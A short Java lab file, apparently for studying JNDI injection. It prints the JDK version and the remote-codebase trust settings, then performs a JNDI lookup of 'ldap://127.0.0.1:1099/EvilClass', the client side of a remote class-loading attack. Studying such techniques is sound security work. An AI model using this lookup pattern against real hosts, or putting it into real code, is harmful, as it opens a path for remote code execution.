package JNDI;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.Hashtable;

public class JndiLookupInjection {

//    JNDI 客户端

    public static void main(String[] args) {

//        jdk 1.8 压根就不行
        System.out.println(System.getProperty("java.version"));
        System.out.println("com.sun.jndi.rmi.object.trustURLCodebase: " + System.getProperty("com.sun.jndi.rmi.object.trustURLCodebase"));
        System.out.println("java.rmi.server.useCodebaseOnly: " + System.getProperty("java.rmi.server.useCodebaseOnly"));


        try {
            InitialContext context = new InitialContext();
            System.out.println(context.getClass().getClassLoader());
            context.lookup("ldap://127.0.0.1:1099/EvilClass");
            System.out.println("test end");
        } catch (NamingException e) {
            e.printStackTrace();
        }

    }
}
